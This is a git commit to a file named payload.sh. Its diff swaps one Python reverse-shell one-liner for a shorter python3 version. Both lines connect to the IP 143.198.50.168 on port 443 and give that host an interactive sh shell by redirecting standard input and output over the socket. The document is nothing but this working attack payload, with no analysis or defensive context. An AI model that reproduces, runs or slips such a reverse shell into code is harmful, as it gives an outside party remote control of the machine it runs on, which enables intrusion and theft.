b9e7aafd96d2595256df733519a245e027a8ceeb
beed2112 <32287825+beed2112@users.noreply.github.com>
2026-07-24 12:24:18 -0700

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("143.198.50.168",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("143.198.50.168",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
